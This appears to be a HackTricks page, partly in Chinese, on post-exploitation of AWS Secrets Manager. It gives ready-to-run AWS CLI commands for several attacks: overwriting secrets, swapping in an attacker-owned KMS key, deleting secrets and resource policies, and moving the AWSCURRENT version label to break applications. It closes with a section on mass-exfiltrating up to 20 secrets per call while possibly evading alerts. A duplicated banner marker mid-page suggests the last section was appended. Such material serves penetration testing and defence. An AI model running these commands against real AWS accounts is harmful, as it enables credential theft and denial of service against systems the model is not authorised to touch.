# AWS - Secrets Manager Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Secrets Manager

For more information check:

{{#ref}}
../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Read Secrets

这些 **secrets 本身是敏感信息**， [check the privesc page](../aws-privilege-escalation/aws-secrets-manager-privesc.md) 了解如何读取它们。

### DoS Change Secret Value

更改 secret 的值可能会 **对依赖该值的所有系统造成 DoS。**

> [!WARNING]
> 注意，先前的值也会被存储，所以可以很容易地回到之前的值。
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

如果攻击者拥有 secretsmanager:UpdateSecret 权限，他们可以将 secret 配置为使用由攻击者拥有的 KMS key。该 KMS key 在初始设置时允许任何人访问和使用，因此可以用该新 KMS key 更新 secret。如果该 KMS key 不可访问，就无法更新 secret。

在为 secret 更改 KMS key 之后，攻击者会修改其 KMS key 的配置，使只有他们自己可以访问。这样，secret 的后续版本将用新 KMS key 加密，而由于无法访问该 KMS key，检索 secret 的能力将被丧失。

需要注意的是，这种不可访问性仅会出现在后续版本中，即在 secret 内容更改之后，因为当前版本仍然使用原始 KMS key 加密。
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS 删除 Secret

删除 Secret 的最短天数为 7 天
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
## secretsmanager:RestoreSecret

可以恢复一个 secret，这允许恢复那些已被计划删除的 secret，因为 secret 的最短删除期限为 7 天，最长为 30 天。结合 secretsmanager:GetSecretValue 权限，这就可以检索它们的内容。

要恢复正在被删除的 secret，你可以使用以下命令：
```bash
aws secretsmanager restore-secret \
--secret-id <Secret_Name>
```
## secretsmanager:DeleteResourcePolicy

此操作允许删除控制谁可以访问 secret 的资源策略。若该资源策略被配置为允许特定用户组访问，可能会导致 DoS。

要删除该资源策略：
```bash
aws secretsmanager delete-resource-policy \
--secret-id <Secret_Name>
```
## secretsmanager:UpdateSecretVersionStage

Secret 的状态用于管理其版本。AWSCURRENT 标记应用使用的活动版本，AWSPREVIOUS 保存先前的版本以便在必要时回滚，AWSPENDING 在轮换过程中使用，用于准备并验证新版本，随后再将其设为当前版本。

应用程序总是读取被标记为 AWSCURRENT 的版本。如果有人把该标签移到错误的版本，应用将使用无效凭证并可能失败。

AWSPREVIOUS 不会被自动使用。不过，如果 AWSCURRENT 被移除或错误地重新分配，可能会看起来一切仍在使用先前的版本运行。
```bash
aws secretsmanager update-secret-version-stage \
--secret-id <your-secret-name-or-arn> \
--version-stage AWSCURRENT \
--move-to-version-id <target-version-id> \
--remove-from-version-id <previous-version-id>
```
{{#include ../../../banners/hacktricks-training.md}}





### Mass Secret Exfiltration via BatchGetSecretValue (up to 20 per call)

滥用 Secrets Manager 的 BatchGetSecretValue API 在单次请求中检索最多 20 个 secret。与对每个 secret 逐个调用 GetSecretValue 相比，这可以显著减少 API 调用次数。如果使用 filters（tags/name），还需要 ListSecrets 权限。CloudTrail 仍会为批量中检索到的每个 secret 记录一条 GetSecretValue 事件。

Required permissions
- secretsmanager:BatchGetSecretValue
- secretsmanager:GetSecretValue 针对每个目标 secret
- secretsmanager:ListSecrets 如果使用 --filters
- kms:Decrypt 对 secrets 使用的 CMKs（如果不使用 aws/secretsmanager）

> [!WARNING]
> 注意，权限 `secretsmanager:BatchGetSecretValue` 本身不足以检索 secrets，你还需要对要检索的每个 secret 拥有 `secretsmanager:GetSecretValue` 权限。

Exfiltrate by explicit list
```bash
aws secretsmanager batch-get-secret-value \
--secret-id-list <secret1> <secret2> <secret3> \
--query 'SecretValues[].{Name:Name,Version:VersionId,Val:SecretString}'
```
Exfiltrate 通过 filters (tag key/value or name prefix)
```bash
# By tag key
aws secretsmanager batch-get-secret-value \
--filters Key=tag-key,Values=env \
--max-results 20 \
--query 'SecretValues[].{Name:Name,Val:SecretString}'

# By tag value
aws secretsmanager batch-get-secret-value \
--filters Key=tag-value,Values=prod \
--max-results 20

# By name prefix
aws secretsmanager batch-get-secret-value \
--filters Key=name,Values=MyApp
```
处理部分失败
```bash
# Inspect the Errors list for AccessDenied/NotFound and retry/adjust filters
aws secretsmanager batch-get-secret-value --secret-id-list <id1> <id2> <id3>
```
影响
- 使用更少的 API 调用，快速 “smash-and-grab” 大量 secrets，可能绕过针对 GetSecretValue 激增调整的告警。
- CloudTrail 日志仍然包含批量检索的每个 secret 的一个 GetSecretValue 事件。
